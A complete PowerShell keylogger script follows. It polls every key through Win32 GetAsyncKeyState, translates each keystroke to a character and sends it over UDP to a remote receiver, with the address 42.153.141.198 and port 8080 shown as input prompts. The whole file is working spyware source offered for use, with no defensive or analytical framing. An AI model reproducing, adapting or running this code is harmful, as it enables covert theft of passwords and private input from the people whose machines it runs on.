#requires -Version 2
function Start-KeyLogger($ReceiverIPAddress, $ReceiverPort) 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to stop.' -ForegroundColor Red

    # Validate the provided IP address format
    if (-not ($ReceiverIPAddress -as [System.Net.IPAddress])) {
        Write-Host "Invalid IP address format. Please provide a valid IPv4 or IPv6 address." -ForegroundColor Red
        return
    }

    # create socket object
    $socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Dgram, [System.Net.Sockets.ProtocolType]::Udp)

    # convert receiver IP address to IPAddress object
    $receiverIP = [System.Net.IPAddress]::Parse($ReceiverIPAddress)
    $receiverEndPoint = New-Object System.Net.IPEndPoint($receiverIP, $ReceiverPort)

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and stops the keylogger
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # send key to receiver
            $keyToSend = [System.Text.Encoding]::Unicode.GetBytes($mychar.ToString())
            $socket.SendTo($keyToSend, $receiverEndPoint)
          }
        }
      }
    }
  }
  finally
  {
    # close socket
    $socket.Close()
  }
}

# Set the IP address and port of the receiver
$receiverIPAddress = Read-Host 42.153.141.198
$receiverPort = Read-Host 8080

# Start the keylogger with the specified receiver IP address and port
Start-KeyLogger -ReceiverIPAddress $receiverIPAddress -ReceiverPort $receiverPort
